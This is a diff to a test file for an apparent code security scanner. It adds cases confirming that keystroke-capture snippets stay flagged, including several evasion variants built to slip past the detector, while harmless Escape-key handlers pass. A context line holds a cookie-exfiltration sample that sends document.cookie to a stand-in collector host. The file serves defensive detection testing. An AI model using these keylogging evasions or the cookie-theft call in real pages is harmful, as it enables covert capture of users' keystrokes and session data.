@@ -92,6 +92,31 @@ for (const capture of [
   assert.equal(run(gsapPrelude + capture).passed, false, `key capture stays flagged: ${capture}`);
 }
 
+// Named callbacks are not inspected, so they keep the risk (Codex P1).
+const namedCallback = gsapPrelude + `document.addEventListener('keydown', save); function isEscape(e) { return e.key === 'Escape'; }`;
+assert.equal(run(namedCallback).risks, 1, 'named keyboard callback stays flagged');
+
+// The event object may not escape the inline callback or be read another way.
+for (const evasion of [
+  `document.addEventListener('keydown', e => { const x = e; if (e.key === 'Escape') close(); log(x); });`,
+  `document.addEventListener('keydown', e => { if (e.key === 'Escape') close(); record(e); });`,
+  `document.addEventListener('keydown', e => { if (e.key === 'Escape') close(); last = window.event.key; });`,
+  `document.addEventListener('keydown', e => { if (e.key === 'Escape') x = /}/; buf += e.key });`,
+  `document.addEventListener('keydown', e => { if (e.key === 'Escape') close(); // }\n buf += e.key });`,
+  `document.addEventListener('keydown', e => { if (e.key === 'Escape') close(); typed = e.target.value; });`
+]) {
+  assert.equal(run(gsapPrelude + evasion).passed, false, `keyboard evasion stays flagged: ${evasion}`);
+}
+
+// Unrelated .code reads elsewhere do not cancel the exemption (Codex P2).
+const unrelatedCode = gsapPrelude + `fetchStatus().then(response => { status = response.code; });
+document.addEventListener('keydown', e => { if (e.key === 'Escape') close(); });`;
+assert.equal(run(unrelatedCode).risks, 0, 'unrelated .code read is not keystroke capture');
+
+// Expression-bodied arrows and listener options are still inline callbacks.
+const expressionArrow = gsapPrelude + `document.addEventListener('keydown', e => e.key === 'Escape' && close(), { passive: true });`;
+assert.deepEqual(run(expressionArrow), { passed: true, risks: 0, flagged: 0 }, 'expression-bodied Escape handler is accessibility');
+
 // The other security-risk rules are untouched.
 const cookieExfil = gsapPrelude + `fetch('https://collector.example/' + document.cookie);`;
 assert.equal(run(cookieExfil).risks, 1, 'cookie exfiltration stays flagged');
